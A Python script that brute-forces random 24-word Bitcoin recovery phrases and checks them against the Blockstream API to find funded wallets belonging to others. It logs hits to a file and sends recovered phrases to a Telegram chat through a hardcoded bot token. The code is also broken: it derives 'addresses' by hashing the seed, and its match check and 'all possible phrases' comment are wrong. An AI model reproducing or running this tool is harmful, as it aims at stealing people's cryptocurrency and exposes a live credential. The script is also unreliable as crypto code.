import requests
from hashlib import sha256
from multiprocessing.dummy import Pool
from time import sleep
from random import randint
from tqdm import tqdm
from mnemonic import Mnemonic
import telegram
from retrying import retry


# Replace YOUR_BOT_TOKEN with your actual bot token
bot = telegram.Bot(token='5873688364:AAGwajC5dZCL-Ot765MsT5J2OVmdY3RfmW4')


# Blockstream API endpoint
URL = "https://blockstream.info/api/address/"

# set minimum and maximum balance
MIN_BALANCE = 1e8
MAX_BALANCE = 5e8

# set minimum and maximum confirmations
MIN_CONF = 1
MAX_CONF = 10

# initialize mnemonic module with BIP39 wordlist
mnemo = Mnemonic("english")

# generate list of all possible 24-word mnemonic phrases with 256-bit strength
words = mnemo.generate(strength=256)
possible_phrases = [" ".join(words)]

# calculate original entropy
entropy = mnemo.to_entropy(words)

# generate seed
seed = mnemo.to_seed(words, passphrase="")

@retry(wait_fixed=5000, stop_max_attempt_number=3)

def check_balance_btc(phrase):
    """Checks the balance of a BTC wallet using the Blockstream API"""
    seed = mnemo.to_seed(phrase, passphrase="")
    h = sha256(seed).hexdigest()
    url = URL + h + "/balance"
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3"
    }
    try:
        # Limit the number of requests to Blockstream API
        with requests.Session() as session:
            adapter = requests.adapters.HTTPAdapter(pool_connections=100, pool_maxsize=100)
            session.mount('http://', adapter)
            session.mount('https://', adapter)
            r = session.get(url, headers=headers, timeout=2)
        r.raise_for_status()
        balance = int(r.text.strip())
        return balance
    except (requests.HTTPError, requests.ConnectionError):
        pass


def main():
    while True:
        # generate random 24-word mnemonic phrase
        phrase = mnemo.generate(strength=256)
        # check balance of the wallet
        balance = check_balance_btc(phrase)
        if balance and MIN_BALANCE <= balance <= MAX_BALANCE:
            print(f"\n[+] {phrase} : {float(balance)/1e8} BTC", flush=True)
            # save wallet to file
            with open("results/wallets.txt", "a") as f:
                f.write(f"{phrase} : {float(balance)/1e8} BTC\n")
            # check if the seed matches the wallet
            if mnemo.to_seed(phrase) == seed:
                print("[!] Seed match found!")
                # Send notification to @sorrymenow on Telegram
                bot_token = '5873688364:AAGwajC5dZCL-Ot765MsT5J2OVmdY3RfmW4'
                chat_id = '1359065559'
                message = f"[!] Seed match found for phrase: {phrase}"
                requests.get(f'https://api.telegram.org/bot{bot_token}/sendMessage?chat_id={chat_id}&text={message}')
                break

        else:
            if balance:
                print(f"[-] {phrase} : Balance {float(balance)/1e8} BTC", flush=True)
            else:
                print(f"[-] {phrase} : No balance", flush=True)


if __name__ == "__main__":
    # print seed and original entropy
    print("Seed:", seed)
    print("Entropy:", entropy)

    with open("results/wallets.txt", "w") as f:
        f.write("")

    main()
